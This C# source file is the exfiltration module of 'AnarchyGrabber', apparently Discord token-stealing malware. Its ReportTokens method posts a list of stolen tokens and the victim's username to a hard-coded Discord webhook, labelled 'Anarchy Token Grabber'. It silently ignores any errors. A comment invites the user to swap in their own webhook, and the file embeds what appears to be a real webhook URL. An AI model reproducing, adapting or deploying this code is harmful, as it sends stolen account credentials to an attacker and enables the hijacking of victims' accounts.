using System;
using System.Collections.Generic;
using System.Net.Http;

namespace AnarchyGrabber
{
    public static class Webhook
    {
        //you've got to change this to your own discord webhook url
        private static readonly string _hookUrl = "https://discordapp.com/api/webhooks/689596782618869845/vsXfyEVW59MNftcWtnrvDCKKHmcQPJ9HT0DF7KR5K4iyVv9IxvopfPWaU91Y5h_JHi7B";


        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Anarchy Token Grabber" },
                        { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }
    }
}
